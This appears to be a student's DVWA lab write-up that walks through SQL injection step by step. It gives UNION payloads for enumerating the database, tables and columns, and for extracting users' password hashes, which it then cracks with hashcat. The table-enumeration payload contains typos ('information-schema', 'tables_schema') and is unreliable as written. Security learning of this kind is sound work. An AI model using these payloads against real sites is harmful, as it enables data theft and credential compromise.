# SQL Injection - DVWA Lab

## Overview
This exercise demonstrates a classic **SQL Injection (SQLi)** vulnerability in the DVWA (Damn Vulnerable Web Application).  
The goal was to enumerate the database, extract sensitive information, and validate the impact of insecure SQL query handling.

---

## Attack Narrative

### 1. Basic Injection Test
Payload used:
```sql
id=1' OR '1'='1
```
what i saw:
![Basic Injection Test](/web-vulns-sqli/screenshots/image.png)


### 2. Database & User Enumeration
Payload used:
```sql
1' UNION SELECT database(), user()-- -
```
result:
![Database User Enumeration](/web-vulns-sqli/screenshots/database-user-enum.png)
- Database in use: dvwa
- Current DB user: dvwa@localhost

### 3. Table Enumeration
Payload used:
```sql
1' UNION SELECT table_name, NULL FROM information-schema.tables WHERE tables_schema=database()-- -
```
result:
![Table discovery](/web-vulns-sqli/screenshots/table-discovery.png)
- identified what tables are in the database (including users).

### 4. Column Enumeration
Payload used:
```sql
1' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name="users"-- -
```
result:
![column discovery](/web-vulns-sqli/screenshots/column-enum.png)

### 5. Extracting Credentials
Payload used:
```sql
1' UNION SELECT user, password FROM users-- -
```
result:
![password hash extraction](/web-vulns-sqli/screenshots/passwd-extraction.png)
- got to know about the exact usernames and their hashed passwords.

## Password Decoding
command used:
```bash
hashcat -m 0 hashes.txt --show
```
this gave me the exact password for each user:
![decoded passwords](/web-vulns-sqli/screenshots/decoded-passwd.png)
